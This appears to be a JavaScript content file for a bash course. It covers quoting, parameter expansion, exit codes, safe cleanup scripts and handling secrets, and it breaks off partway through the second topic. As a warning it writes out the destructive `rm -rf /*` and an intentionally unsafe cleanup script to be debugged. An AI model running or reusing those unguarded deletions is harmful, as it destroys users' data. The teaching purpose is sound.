(function () {
  var topics = [], practice = [], quiz = [], interview = [];
  var LAB = 'Your own Linux machine, WSL, or a throwaway container (<code>docker run -it --rm ubuntu:24.04 bash</code>). Bash 5. No cloud account and no real secrets needed.';
  // B`...` = bash code exactly as typed. It is a raw template, so backslashes stay as written.
  // Bash's dollar-brace is written as \${ in this file (so JS does not interpolate it); B turns it back into ${.
  function B(s) {
    if (s.length !== 1) throw new Error('B`` code must not contain JS interpolation');
    return s.raw[0].replace(/\\\$\{/g, '$' + '{').replace(/\\`/g, '`');
  }
  // Compact problem builder: every problem has the same shape; all code is bash.
  function P(o) {
    var p = {
      title: o.t, level: o.l, tags: o.tags, companies: o.co,
      statement: o.s, constraints: o.c || LAB, example: o.ex,
      brute: { why: o.bw },
      mcq: { q: o.q[0], options: o.q[1], answer: o.q[2], explain: o.q[3] },
      hints: o.h,
      solution: { approach: o.a, code: { lang: 'bash', code: o.code }, complexity: o.cx, followUps: o.f }
    };
    if (o.bc) p.brute.code = { lang: 'bash', code: o.bc };
    return p;
  }
  function box(id, label, x, y, w) { return { id: id, label: label, x: x, y: y, shape: 'box', w: w || 18 }; }
  function one(k, v) { var h = {}; h[k] = v; return h; }
  // Pad short frame lists (unusual inputs) to the minimum of 4 with a closing tip that repeats the last picture.
  function pad4(f, tip) { while (f.length < 4) f.push({ narr: tip, parts: f[f.length - 1].parts }); return f; }
  var D = '$' + '{';   // dollar-brace for code, vars and table parts (the renderer escapes those)
  var DH = '&#36;{';   // the same for narration HTML, where a literal dollar-brace is not allowed
  // Split a command line the way the shell does for simple cases: spaces separate words, '...' and "..." group.
  function shellWords(line) {
    var out = [], cur = '', inQ = null, had = false;
    for (var i = 0; i < line.length; i++) {
      var ch = line.charAt(i);
      if (inQ) { if (ch === inQ) inQ = null; else cur += ch; continue; }
      if (ch === '"' || ch === "'") { inQ = ch; had = true; continue; }
      if (/\s/.test(ch)) { if (cur || had) out.push(cur); cur = ''; had = false; continue; }
      cur += ch;
    }
    if (inQ) throw new Error('Unclosed quote ' + inQ + ' in: ' + line);
    if (cur || had) out.push(cur);
    return out;
  }

  // ───────────────────────── Topic 1: variables and quoting ─────────────────────────
  topics.push({
    title: 'Variables, Quoting and Expansion: Why "$VAR" Saves Your Server',
    analogy: `<p>A variable is a <b>labelled jar</b>. Double quotes are <b>shrink-wrap</b> around the jar. When you write <code>"$FILE"</code>, the shell hands the jar over in one piece. When you write <code>$FILE</code> with no quotes, the shell <b>tips the jar out on the table</b>: it splits the contents at every space and treats any <code>*</code> as "grab everything that matches". An empty jar tipped out is nothing at all, so <code>rm -rf $DIR/*</code> quietly becomes <code>rm -rf /*</code>. Most scary bash bugs are a missing pair of quotes.</p>`,
    explain: `<p>🟢 <b>Setting and reading a variable.</b> <code>NAME=value</code> with <b>no spaces</b> around <code>=</code> (with spaces, bash thinks <code>NAME</code> is a command). Read it with <code>$NAME</code> or <code>&#36;{NAME}</code>. The braces matter when text follows: <code>"&#36;{env}_backup"</code> works, <code>"$env_backup"</code> looks for a variable called <code>env_backup</code>.</p>
      <p>🟢 <b>Three kinds of quotes.</b></p>
      ${H.table(['You write', 'What the shell does', 'Use it for'], [
        ['<code>"$f"</code> (double)', 'expands <code>$vars</code> and <code>$(commands)</code>, but <b>no</b> splitting, <b>no</b> globbing', 'almost every variable you use'],
        ["<code>'$f'</code> (single)", 'nothing is expanded: you get the exact characters', 'awk programs, regexes, literal text'],
        ['<code>$f</code> (none)', 'expands, then <b>splits on spaces</b> and <b>expands * ? [ ]</b>', 'almost never in scripts'],
        ['<code>"$(cmd)"</code>', 'runs <code>cmd</code> and pastes its output (trailing newlines removed)', 'capturing a value: <code>now="$(date -u +%F)"</code>']
      ])}
      <p>🟢 <b>Shell variables vs environment variables.</b> A plain assignment lives only in this shell. <code>export NAME</code> puts it in the <b>environment</b>, so child programs (your script, <code>aws</code>, <code>python</code>) can see it. <code>NAME=value cmd</code> sets it for one command only. Config such as tokens and regions should arrive this way, from the environment, and <span class="c-r">never</span> be typed into the script.</p>
      <p>🔵 <b>Parameter expansion: bash's built-in string tools.</b> These run inside the shell, with no extra program:</p>
      ${H.table(['Expansion', 'Meaning', 'With path=/var/backups/db.sql.gz'], [
        ['<code>&#36;{VAR:-default}</code>', 'use default if VAR is unset or empty', '<code>&#36;{REGION:-eu-west-1}</code> → eu-west-1'],
        ['<code>&#36;{VAR:?message}</code>', '<b>stop the script</b> with message if unset or empty', 'the guard for <code>rm</code> and for secrets'],
        ['<code>&#36;{VAR##*/}</code>', 'cut the longest match of <code>*/</code> from the front', 'db.sql.gz (like basename)'],
        ['<code>&#36;{VAR%/*}</code>', 'cut the shortest match of <code>/*</code> from the end', '/var/backups (like dirname)'],
        ['<code>&#36;{VAR%.gz}</code>', 'remove a suffix', '/var/backups/db.sql'],
        ['<code>&#36;{#VAR}</code>', 'length in characters', '22'],
        ['<code>&#36;{VAR/old/new}</code>', 'replace first match (<code>//</code> = all)', 'quick renames']
      ])}
      <p>🔵 <b>Arrays for lists.</b> A list of file names or command options belongs in an array: <code>opts=(-a --delete --exclude '*.tmp')</code>, then <code>rsync "&#36;{opts[@]}" src/ dst/</code>. The form <code>"&#36;{arr[@]}"</code> (quoted, with <code>@</code>) gives each item as one separate word, even if it has spaces. A string like <code>opts="-a --delete"</code> breaks as soon as one option has a space.</p>
      <p>🔵 <b>Numbers.</b> Bash variables are text. Use <code>$(( ))</code> for whole-number maths: <code>free_pct=$(( 100 - used_pct ))</code>. There are no decimals; use <code>awk</code> for those.</p>`,
    clues: [
      '"the script broke on a file name with a space" → an unquoted variable: use <code>"$f"</code> and <code>"&#36;{arr[@]}"</code>',
      '"rm -rf deleted the wrong folder" / "variable was empty" → <code>&#36;{DIR:?}</code> guard and <code>set -u</code>',
      '"how do you pass a token to a script?" → environment variable checked with <code>&#36;{API_TOKEN:?}</code>; never hardcode, never echo it',
      '"works in my terminal, not in the script" → the variable was set but not <code>export</code>ed, so the child process cannot see it',
      '"strip the extension / get the file name" → parameter expansion <code>&#36;{f%.*}</code>, <code>&#36;{f##*/}</code> instead of extra sed calls',
      '"loop over the output of ls" → a glob <code>for f in /dir/*.log</code>, never <code>$(ls)</code>'
    ],
    code: [B`#!/usr/bin/env bash
# Lab: save as vars.sh, run with: bash vars.sh
# Shows quoting, defaults, required values and string tools. Safe: it only uses a temp folder.
set -euo pipefail

work="$(mktemp -d)"            # a fresh empty folder, e.g. /tmp/tmp.Xy12
cd "$work"
touch "my backup.tar.gz" app.log

f="my backup.tar.gz"
ls -1 "$f"                      # quoted: one argument -> works
# ls $f                         # unquoted: two arguments "my" and "backup.tar.gz" -> fails

# Defaults and required values (config comes from the environment, not the script)
region="\${REGION:-eu-west-1}"   # optional, with a default
echo "region=$region"
# token="\${API_TOKEN:?set API_TOKEN first}"   # required: stops the script if missing

# String tools without extra programs
path=/var/backups/db-2026-03-01.sql.gz
echo "file=\${path##*/}"         # db-2026-03-01.sql.gz
echo "dir=\${path%/*}"           # /var/backups
echo "nogz=\${path%.gz}"         # /var/backups/db-2026-03-01.sql

# Arrays keep each item whole
files=("$work"/*)                 # a glob, not $(ls)
echo "found \${#files[@]} files"
for x in "\${files[@]}"; do echo " - \${x##*/}"; done

rm -rf -- "\${work:?}"            # guarded delete of our own temp folder
# Output:
# my backup.tar.gz
# region=eu-west-1
# file=db-2026-03-01.sql.gz
# dir=/var/backups
# nogz=/var/backups/db-2026-03-01.sql
# found 2 files
#  - app.log
#  - my backup.tar.gz`],
    codeTitle: ['Quoting, defaults and string tools in one safe script'],
    viz: [{
      title: 'Word splitting: what rm really receives',
      input: 'my backup 2026.tar.gz',
      inputLabel: 'a file name (spaces and * welcome)',
      gen: function (input) {
        var val = String(input == null ? '' : input);
        if (val.length > 40) throw new Error('Keep the file name under 40 characters');
        if (/["'$`\\]/.test(val)) throw new Error('Use plain characters, spaces and * only');
        var folder = ['app.log', 'app.log.1', 'notes.txt', val].filter(function (x, i, a) { return x && a.indexOf(x) === i; });
        function glob(word) {
          if (word.indexOf('*') < 0 && word.indexOf('?') < 0) return [word];
          var re = new RegExp('^' + word.replace(/[.+^(){}|[\]]/g, '\\$&').replace(/\*/g, '.*').replace(/\?/g, '.') + '$');
          var hits = folder.filter(function (n) { return re.test(n); });
          return hits.length ? hits : [word];
        }
        var split = val.split(/\s+/).filter(Boolean);
        var expanded = [];
        split.forEach(function (w) { expanded = expanded.concat(glob(w)); });
        var f = [];
        f.push({ narr: 'We store a file name in a variable: <code>f="' + H.esc(val) + '"</code>. Inside the jar it is <b>one</b> value. The folder we are in holds these files.', parts: [
          { type: 'vars', label: 'shell variables', vals: { f: val } },
          { type: 'set', label: 'files in the current folder', items: folder }
        ] });
        f.push({ narr: 'Now the script runs <code>rm $f</code> with <b>no quotes</b>. Step 1 of expansion is <b>word splitting</b>: bash cuts the value at every space (the characters in <code>IFS</code>). We get <b>' + split.length + '</b> piece(s).', parts: [
          { type: 'array', label: 'after word splitting', values: split.length ? split : ['(nothing)'], hl: split.length > 1 ? (function () { var h = {}; split.forEach(function (_, i) { h[i] = 'bad'; }); return h; })() : { 0: 'cur' } }
        ] });
        f.push({ narr: 'Step 2 is <b>globbing</b>: any piece with <code>*</code> or <code>?</code> is replaced by the matching file names. ' + (expanded.length !== split.length ? 'A star matched real files, so <b>more</b> files are now on the list.' : 'No piece had a wildcard, so nothing changed here. Try a name with <code>*</code>, like <code>app*</code>.'), parts: [
          { type: 'array', label: 'arguments rm receives (argv)', values: expanded.length ? expanded : ['(nothing)'], hl: (function () { var h = {}; expanded.forEach(function (w, i) { h[i] = folder.indexOf(w) >= 0 && w !== val ? 'bad' : (w === val ? 'ok' : 'cur'); }); return h; })() }
        ] });
        var wrong = expanded.filter(function (w) { return w !== val; });
        f.push({ narr: 'Result of <code>rm $f</code>: ' + (wrong.length ? 'rm tries to delete <b>' + wrong.map(H.esc).join(', ') + '</b>. ' + (wrong.some(function (w) { return folder.indexOf(w) >= 0; }) ? H.c('r', 'Real files that you never named are gone.') : 'Those names do not exist, so rm prints errors and the real file stays.') : 'With this name it happens to work, but only by luck. Add a space or a * and it breaks.'), parts: [
          { type: 'set', label: 'files after rm $f', items: folder.filter(function (n) { return expanded.indexOf(n) < 0; }) },
          { type: 'text', html: 'Unquoted variables are the number one source of bash bugs. ShellCheck warns about this as SC2086.' }
        ] });
        f.push({ narr: 'Now the fix: <code>rm -- "$f"</code>. Double quotes switch off splitting and globbing. rm gets exactly <b>one</b> argument, the real name. The <code>--</code> means "no more options", so even a name starting with <code>-</code> is safe.', parts: [
          { type: 'array', label: 'arguments rm receives (argv)', values: [val || '(empty string)'], hl: { 0: 'ok' } },
          { type: 'set', label: 'files after rm -- "$f"', items: folder.filter(function (n) { return n !== val; }) }
        ] });
        f.push({ narr: 'The worst case is an <b>empty</b> variable. <code>rm -rf $DIR/*</code> with <code>DIR=""</code> becomes <code>rm -rf /*</code>. Guard it: <code>rm -rf -- "' + DH + 'DIR:?DIR is empty}"/*</code> stops the script before rm even starts.', parts: [
          { type: 'code', label: 'empty variable, two versions', lang: 'bash', code: 'DIR=""\nrm -rf $DIR/*                 # becomes rm -rf /*  (disaster)\nrm -rf -- "' + D + 'DIR:?DIR is empty}"/*   # script stops: DIR is empty', hl: { 2: 'bad', 3: 'ok' } }
        ] });
        return f;
      }
    }, {
      title: 'Parameter expansion playground',
      input: '/var/backups/db-2026-03-01.sql.gz',
      inputLabel: 'a file path to cut up',
      gen: function (input) {
        var p = String(input || '').trim();
        if (!p || p.length > 60 || /\s/.test(p)) throw new Error('Give one path without spaces, under 60 characters');
        function longestPrefix(s, pat) { // pat is '*/' : remove up to the last slash
          return pat === '*/' ? s.slice(s.lastIndexOf('/') + 1) : s;
        }
        var base = longestPrefix(p, '*/');
        var dir = p.lastIndexOf('/') >= 0 ? p.slice(0, p.lastIndexOf('/')) : p;
        var dot = p.lastIndexOf('.');
        var noext = dot > p.lastIndexOf('/') ? p.slice(0, dot) : p;
        var firstDot = base.indexOf('.');
        var stem = firstDot >= 0 ? base.slice(0, firstDot) : base;
        var f = [];
        f.push({ narr: 'We have <code>path=' + H.esc(p) + '</code>. Parameter expansion lets bash cut this text up <b>without</b> starting <code>basename</code>, <code>dirname</code> or <code>sed</code>. That matters inside loops over thousands of files.', parts: [{ type: 'vars', label: 'variables', vals: { path: p } }] });
        f.push({ narr: '<code>' + DH + 'path##*/}</code>: <code>#</code> cuts from the <b>front</b>, <code>##</code> cuts the <b>longest</b> match. The pattern <code>*/</code> eats everything up to the last slash. Result: the file name.', parts: [{ type: 'vars', label: 'result', vals: { 'path##*/': base }, hl: { 'path##*/': 'ok' } }] });
        f.push({ narr: '<code>' + DH + 'path%/*}</code>: <code>%</code> cuts from the <b>end</b>, shortest match. The pattern <code>/*</code> removes the last slash and what follows. Result: the folder.', parts: [{ type: 'vars', label: 'result', vals: { 'path##*/': base, 'path%/*': dir }, hl: { 'path%/*': 'ok' } }] });
        f.push({ narr: '<code>' + DH + 'path%.*}</code> removes the <b>last</b> extension only. Handy for <code>' + DH + 'f%.gz}</code> after unzipping.', parts: [{ type: 'vars', label: 'result', vals: { 'path##*/': base, 'path%/*': dir, 'path%.*': noext }, hl: { 'path%.*': 'ok' } }] });
        f.push({ narr: 'Combine them: take the file name first, then <code>' + DH + 'name%%.*}</code> (double <code>%%</code> = longest match from the end) strips <b>every</b> extension. <code>' + DH + '#path}</code> gives the length: <b>' + p.length + '</b> characters.', parts: [{ type: 'vars', label: 'result', vals: { name: base, 'name%%.*': stem, '#path': String(p.length) }, hl: { 'name%%.*': 'ok', '#path': 'cur' } }] });
        f.push({ narr: 'Defaults: <code>' + DH + 'REGION:-eu-west-1}</code> uses the value if set, else the default. <code>' + DH + 'API_TOKEN:?set API_TOKEN}</code> stops the script with that message if the token is missing. That is how a script <b>reads</b> secrets from the environment without ever containing them.', parts: [
          { type: 'table', label: 'defaults and guards', columns: ['expression', 'REGION unset', 'REGION=us-east-1'], rows: [[D + 'REGION:-eu-west-1}', 'eu-west-1', 'us-east-1'], [D + 'REGION:?missing}', 'script stops: missing', 'us-east-1'], [D + 'REGION:+set}', '(empty)', 'set']], hl: { 1: 'sel' } }
        ] });
        return f;
      }
    }],
    examples: [
      { title: 'A file name with a space breaks a backup copy', html: `<p>A nightly job copied exports with <code>cp $f /backup/</code>. The day a customer uploaded <code>Q1 report.csv</code>, cp received two names, <code>Q1</code> and <code>report.csv</code>, and both failed. Nothing was copied. Quoting fixes it. This self-contained script shows both behaviours; its output is in the comments.</p>`, code: B`#!/usr/bin/env bash
cd "$(mktemp -d)"
touch "my backup.tar.gz"
f="my backup.tar.gz"
ls $f   2>&1 | sed 's/^/unquoted: /'
ls "$f"      | sed 's/^/quoted:   /'
# Output:
# unquoted: ls: cannot access 'my': No such file or directory
# unquoted: ls: cannot access 'backup.tar.gz': No such file or directory
# quoted:   my backup.tar.gz` },
      { title: 'The empty-variable rm (the Steam for Linux bug)', html: `<p>In January 2015 a Steam for Linux script ran <code>rm -rf "$STEAMROOT/"*</code>. When <code>STEAMROOT</code> came out empty, that line became <code>rm -rf /*</code> and wiped users' files. The fix is a guard: <code>&#36;{VAR:?msg}</code> stops the script before rm runs. Here, the second echo never happens and the exit status is ${H.c('r', '1')}.</p>`, code: B`#!/usr/bin/env bash
set -u
cleanup_dir() {
  local dir="\${1:?usage: cleanup_dir DIR}"   # a function argument can be guarded too
  echo "would delete: \${dir}/*"
}
cleanup_dir /srv/app/cache
BACKUP_DIR=""
echo "rm -rf \${BACKUP_DIR:?BACKUP_DIR is empty, refusing}/old"
echo "never printed"
# Output (exit status 1):
# would delete: /srv/app/cache/*
# script.sh: line 9: BACKUP_DIR: BACKUP_DIR is empty, refusing` },
      { title: 'Reading a secret from the environment without leaking it', html: `<p>A script that calls an internal API needs a token. It must not be written in the script (the script lives in Git) and must not be printed (logs are read by many people). Read it with a guard, show only that it is set, and pass it to curl through a header read from stdin so it does not appear in <code>ps</code> output either. Run it as <code>API_TOKEN=dummy-value bash call-api.sh</code> to try it with a fake value.</p>`, code: B`#!/usr/bin/env bash
set -euo pipefail
: "\${API_TOKEN:?set API_TOKEN in the environment (never in this file)}"
API_URL="\${API_URL:-https://api.example.internal/v1/health}"
echo "token is set (\${#API_TOKEN} characters), calling $API_URL"
# -H @- reads the header from stdin, so the token is not on the command line (visible in ps)
printf 'Authorization: Bearer %s\n' "$API_TOKEN" |
  curl -fsS --max-time 10 -H @- "$API_URL" || echo "call failed (expected with the dummy URL)"
# Output with API_TOKEN=dummy-value:
# token is set (11 characters), calling https://api.example.internal/v1/health
# curl: (6) Could not resolve host: api.example.internal
# call failed (expected with the dummy URL)` },
      { title: 'Command options in an array, not a string', html: `<p>Building rsync options in a string (<code>opts="--exclude *.tmp"</code>) fails twice: the <code>*</code> may glob, and options with spaces split. An array keeps every option exactly as written. <code>printf '&lt;%s&gt;\\n'</code> prints each argument in angle brackets so you can see the boundaries.</p>`, code: B`#!/usr/bin/env bash
opts=(-a --delete --exclude "*.tmp")
printf '<%s>\n' "\${opts[@]}"
echo "count: \${#opts[@]}"
# rsync "\${opts[@]}" /srv/app/ /backup/app/   # how you would use it
# Output:
# <-a>
# <--delete>
# <--exclude>
# <*.tmp>
# count: 4` }
    ],
    deepDive: `<p>🟣 <b>The order of expansions.</b> For each command, bash does: brace expansion (<code>{a,b}</code>), tilde (<code>~</code>), parameter and variable expansion, arithmetic, command substitution (left to right), then <b>word splitting</b> on the unquoted results, then <b>pathname expansion</b> (globbing), then quote removal. Double quotes stop the last three steps for what is inside them. That one sentence explains nearly every quoting bug.</p>
      <p><b>IFS.</b> Word splitting uses the characters in <code>IFS</code> (space, tab, newline by default). <code>while IFS= read -r line</code> sets IFS to empty for that one <code>read</code>, so leading spaces are kept, and <code>-r</code> keeps backslashes. <code>IFS=, read -r a b c</code> splits a CSV line. Changing IFS for the whole script is a classic source of confusion; set it per command instead.</p>
      <p><b>Globs that match nothing.</b> If <code>/var/log/app/*.gz</code> matches no files, bash leaves the pattern as the literal text <code>/var/log/app/*.gz</code>, and your loop runs once with that fake name. Use <code>shopt -s nullglob</code> (no match = empty list) or check <code>[[ -e $f ]] || continue</code> inside the loop.</p>
      <p><b>Exported variables and child processes.</b> A child gets a <b>copy</b> of the parent's environment. It can never change the parent's variables. That is why a script cannot <code>cd</code> or <code>export</code> for your terminal unless you <code>source</code> it. It also means secrets in the environment are visible to that process and its children (and to root via <code>/proc/PID/environ</code>), so pass them only to the process that needs them.</p>
      <p><b>Inside <code>[[ ]]</code> and <code>$(( ))</code></b> word splitting does not happen, so <code>[[ $a == $b ]]</code> is safe on the left. But the right side of <code>==</code> is a <b>pattern</b> unless quoted: <code>[[ $x == "$y" ]]</code> compares text, <code>[[ $x == $y ]]</code> treats <code>*</code> in y as a wildcard. When in doubt, quote. <b>ShellCheck</b> (<code>shellcheck script.sh</code>) catches almost all of these mistakes automatically and should run in CI on every script.</p>`,
    aiEra: `<p>🤖 <b>What AI changes:</b> assistants write quoted, guarded bash well when asked, and they explain an expansion like <code>&#36;{f%%.*}</code> instantly, which is great for learning. Ask an assistant to "add ShellCheck-clean quoting to this script" and it usually fixes most SC2086 warnings in one pass.</p>
      <p><b>Where it goes wrong:</b> generated scripts still contain <code>for f in $(ls)</code>, hardcoded example tokens (<code>API_KEY="sk-..."</code>) that people then replace with real ones and commit, and <code>echo "$TOKEN"</code> "for debugging". <b>Your job:</b> run ShellCheck on anything an AI writes, make sure every secret comes from the environment or a secrets manager with a <code>:?</code> guard, and never paste a real token into a chat to "test the script". Use a dummy value like <code>dummy-value</code>.</p>`,
    problems: [P({
      t: 'Fix the cleanup script that could wipe the wrong folder', l: 'Easy', tags: ['quoting', 'variables', 'rm', 'safety'], co: ['AWS Support', 'Canonical'],
      s: `<p>This cleanup script runs on build servers. It removes old build folders. One morning a server lost its whole <code>/srv</code> tree. Find every bug, then rewrite it so that it can only ever delete <b>old folders inside the build directory</b>, works with names that contain spaces, and refuses to run when its configuration is missing.</p>
<pre>#!/bin/bash
BUILD_ROOT=$1
KEEP=$2
cd $BUILD_ROOT
for d in $(ls -t | tail -n +$KEEP); do
  rm -rf $BUILD_ROOT/$d
done</pre>`,
      ex: `<p>Normal run: <code>bash clean-builds.sh /srv/builds 3</code> with 5 build folders keeps the 3 newest and deletes ${H.c('r', '2')}. Run with no arguments: the old script did <code>cd</code> to home, then deleted folders from there. The fixed script prints ${H.c('g', 'usage: clean-builds.sh BUILD_ROOT KEEP')} and exits with status 2. A folder named <code>build 42</code> is deleted as one folder, not as <code>build</code> and <code>42</code>.</p>`,
      bw: `<p>The original trusts everything. With no first argument, <code>BUILD_ROOT</code> is empty: <code>cd</code> with no argument goes to <code>$HOME</code>, and <code>rm -rf /$d</code> then points at top-level folders. If <code>cd</code> fails, the loop runs in whatever folder you were in. <code>$(ls)</code> splits names with spaces, <code>tail -n +$KEEP</code> is off by one (it keeps KEEP-1), and nothing checks that KEEP is a number.</p>`,
      bc: B`#!/bin/bash
BUILD_ROOT=$1          # empty if no argument
KEEP=$2
cd $BUILD_ROOT         # no argument -> cd to $HOME; failure is ignored
for d in $(ls -t | tail -n +$KEEP); do   # splits names on spaces; off by one
  rm -rf $BUILD_ROOT/$d                  # empty BUILD_ROOT -> rm -rf /name
done`,
      q: ['Which single change prevents <code>rm -rf "$BUILD_ROOT/$d"</code> from ever targeting <code>/</code> when the argument is missing?', ['<code>BUILD_ROOT="&#36;{1:?usage: clean-builds.sh BUILD_ROOT KEEP}"</code>', '<code>BUILD_ROOT="&#36;{1:-/}"</code>', 'Adding <code>sudo</code> in front of rm', 'Using <code>rm -r</code> instead of <code>rm -rf</code>'], 0, 'The :? form stops the script with a message when $1 is unset or empty, so rm never runs. :-/ would default to / itself, the worst possible choice. sudo and dropping -f change nothing about which path is targeted.'],
      h: ['<p>Hint 1: list every way each variable can be empty or wrong. Then ask what <code>cd</code> and <code>rm</code> do in each case.</p>', '<p>Hint 2: guard inputs at the top (<code>&#36;{1:?}</code>, a number check with <code>[[ $KEEP =~ ^[0-9]+$ ]]</code>), make <code>cd</code> fatal with <code>set -e</code> or <code>|| exit</code>, and never parse <code>ls</code>: collect folders with a glob into an array.</p>', '<p>Hint 3: sort the array by modification time with <code>stat -c \'%Y %n\'</code> or use <code>find -maxdepth 1 -mindepth 1 -type d -printf \'%T@ %p\\n\'</code> and <code>sort -rn</code>. Delete with <code>rm -rf -- "$d"</code>, and refuse a root that is <code>/</code> or not a directory. Add a <code>--dry-run</code> mode that only prints.</p>'],
      a: `<p>Guard the inputs first: <code>&#36;{1:?}</code> and <code>&#36;{2:?}</code> with a usage message, a regex check that KEEP is a whole number, and a check that the root is a real directory and not <code>/</code>. Resolve it to an absolute path with <code>realpath</code> so every later path is complete. List only the <b>direct child folders</b> with <code>find -mindepth 1 -maxdepth 1 -type d</code>, newest first, separated by NUL bytes so any name is safe. Skip the first KEEP entries and delete the rest with a quoted, <code>--</code>-protected <code>rm</code>. <code>set -euo pipefail</code> makes any failed step stop the script. A <code>DRY_RUN=1</code> variable prints what would be deleted, so you can test on a real server without risk.</p>`,
      code: B`#!/usr/bin/env bash
# clean-builds.sh BUILD_ROOT KEEP  - keep the KEEP newest build folders, delete the rest
# DRY_RUN=1 bash clean-builds.sh /srv/builds 3   -> only prints
set -euo pipefail

usage() { echo "usage: \${0##*/} BUILD_ROOT KEEP" >&2; exit 2; }
[[ $# -eq 2 ]] || usage

root="$(realpath -e -- "$1")" || { echo "no such folder: $1" >&2; exit 2; }
keep="$2"
[[ -d $root ]]               || { echo "not a directory: $root" >&2; exit 2; }
[[ $root != / ]]             || { echo "refusing to clean /" >&2; exit 2; }
[[ $keep =~ ^[0-9]+$ ]]      || { echo "KEEP must be a whole number" >&2; exit 2; }
dry="\${DRY_RUN:-0}"

# Newest first: "mtime path" pairs separated by NUL so spaces and newlines in names are safe
mapfile -d '' dirs < <(
  find "$root" -mindepth 1 -maxdepth 1 -type d -printf '%T@ %p\0' |
  sort -z -rn |
  cut -z -d' ' -f2-
)

echo "found \${#dirs[@]} build folders in $root, keeping $keep"
for (( i = keep; i < \${#dirs[@]}; i++ )); do
  d="\${dirs[i]}"
  case "$d" in "$root"/*) ;; *) echo "skip unexpected path: $d" >&2; continue ;; esac
  if [[ $dry == 1 ]]; then
    echo "would delete: $d"
  else
    rm -rf -- "$d"
    echo "deleted: $d"
  fi
done`,
      cx: `<p>One <code>find</code> and one sort: O(n log n) in the number of build folders, which is tiny. The real cost is the delete itself. Risk is now limited to direct children of a checked, absolute folder.</p>`,
      f: ['How would you also refuse to delete a build that is in use (for example, a folder that a symlink called current points to)?', 'Why is <code>cut -z</code> needed after <code>sort -z</code>, and what breaks if you drop the <code>-z</code> flags?']
    })]
  });

  // ───────────────────────── Topic 2: exit codes, conditionals, loops ─────────────────────────
  topics.push({
    title: 'Exit Codes, Conditionals and Loops: Making Decisions Like an Operator',
    analogy: `<p>Every command hands back a <b>receipt</b> when it finishes: a small number called the <b>exit code</b>. <code>0</code> means "done, all good". Anything else means "something went wrong", and the number says roughly what. A script is like a shift supervisor reading receipts: <i>"if the backup receipt says 0, upload it; if not, call someone; keep trying the health check until it says 0 or we run out of time."</i> <code>if</code>, <code>case</code>, <code>while</code> and <code>until</code> are the supervisor's decisions. All of them read receipts, not printed text.</p>`,
    explain: `<p>🟢 <b>Exit codes.</b> Right after a command, <code>$?</code> holds its exit code (0 to 255). Zero is success, non-zero is failure. Some numbers have a fixed meaning:</p>
      ${H.table(['Code', 'Meaning', 'Typical ops cause'], [
        ['<code>0</code>', 'success', ''],
        ['<code>1</code>', 'general failure', 'grep found <b>no match</b> (not an error for grep!), a test was false'],
        ['<code>2</code>', 'misuse / bad arguments', 'grep or a script given a bad option; also "file missing" for grep'],
        ['<code>126</code>', 'found but not executable', 'missing <code>chmod +x</code>, or a <code>noexec</code> mount'],
        ['<code>127</code>', 'command not found', 'not installed, or not on <code>PATH</code> (a classic under cron)'],
        ['<code>128+N</code>', 'killed by signal N', '130 = Ctrl+C (SIGINT 2), 137 = SIGKILL 9 (often the OOM killer), 143 = SIGTERM 15']
      ])}
      <p>Your own script sets its code with <code>exit N</code>. Monitoring tools, CI pipelines, cron and systemd all read it, so pick meaningful codes and document them.</p>
      <p>🟢 <b><code>if</code> runs a command and checks its receipt.</b> <code>if grep -q ERROR app.log; then ... fi</code>. The square brackets are just a command too: <code>[[ ... ]]</code> is bash's test command, and it returns 0 when the test is true.</p>
      ${H.table(['Test', 'True when', 'Example'], [
        ['<code>[[ -f p ]]</code> / <code>-d</code> / <code>-e</code>', 'p is a file / a folder / exists', '<code>[[ -f /etc/app.conf ]] || exit 1</code>'],
        ['<code>[[ -s p ]]</code>', 'file exists and is not empty', 'the backup is more than 0 bytes'],
        ['<code>[[ -z $v ]]</code> / <code>-n</code>', 'string is empty / not empty', 'missing settings'],
        ['<code>[[ $a == "$b" ]]</code>', 'same text (quote b for exact match)', '<code>[[ $env == prod ]]</code>'],
        ['<code>[[ $v =~ ^[0-9]+$ ]]</code>', 'matches a regex', 'validate a number from the user'],
        ['<code>(( n &gt; 80 ))</code>', 'whole-number comparison', '<code>(( used &gt;= 90 ))</code>']
      ])}
      <p>🟢 <b>Short forms.</b> <code>cmd1 &amp;&amp; cmd2</code> runs cmd2 only if cmd1 succeeded. <code>cmd1 || cmd2</code> runs cmd2 only if cmd1 failed: <code>cd /srv/app || exit 1</code>. <code>case</code> picks a branch by pattern, which is neat for HTTP codes, environments or subcommands (<code>start|stop|status</code>).</p>
      <p>🔵 <b>Loops.</b> <code>for host in web1 web2 web3</code> walks a list. <code>for f in /var/log/app/*.log</code> walks files (a glob, never <code>$(ls)</code>). <code>while IFS= read -r line; do ...; done &lt; hosts.txt</code> reads a file line by line. <code>until curl -fs URL; do sleep 2; done</code> repeats until success. <code>for (( i = 1; i &lt;= 5; i++ ))</code> counts. <code>break</code> leaves a loop, <code>continue</code> skips to the next round.</p>
      <p>🔵 <b>Every waiting loop needs a limit.</b> "Retry until it works" with no maximum turns a dead service into a deploy that hangs for hours. Always cap attempts or time, sleep between tries (ideally longer each time: <b>backoff</b>), and exit non-zero when you give up.</p>`,
    clues: [
      '"how does the script know the command failed?" → the exit code (<code>$?</code>, <code>if cmd</code>, <code>||</code>), never parsing the printed text',
      '"exit code 127 from cron" → command not found: PATH; "126" → not executable; "137" → SIGKILL, check the OOM killer',
      '"wait for the database / the app to come up" → an <code>until</code> loop with a max attempts or deadline, sleep and backoff',
      '"grep returns 1 and my script stops" → no match is exit 1 for grep: handle it with <code>if</code> or <code>|| true</code> on purpose',
      '"variable is empty after my while loop" → the loop ran in a pipe subshell: use <code>done &lt; file</code> or <code>&lt; &lt;(cmd)</code>',
      '"OK / WARNING / CRITICAL" check for monitoring → exit 0 / 1 / 2 (Nagios plugin convention)'
    ],
    code: [B`#!/usr/bin/env bash
# Lab: health-gate.sh - the decisions an operator script makes every day.
# Run it as-is: it checks local things that exist on any Linux box.
set -uo pipefail          # not -e here: we want to inspect failures ourselves

# 1. Exit codes: test, then decide
if [[ -r /etc/os-release ]]; then
  . /etc/os-release
  echo "OS: $PRETTY_NAME"
else
  echo "cannot read /etc/os-release" >&2
  exit 2
fi

# 2. grep: 0 = found, 1 = not found, 2 = error. Handle all three.
grep -q '^root:' /etc/passwd
case $? in
  0) echo "root user present" ;;
  1) echo "no root user?!" ;;
  *) echo "grep failed to read the file" >&2 ;;
esac

# 3. Number tests with (( )): disk usage of /
used=$(df --output=pcent / | tail -n 1 | tr -dc '0-9')
if (( used >= 90 )); then echo "CRITICAL: / at $used%"
elif (( used >= 80 )); then echo "WARNING: / at $used%"
else echo "OK: / at $used%"
fi

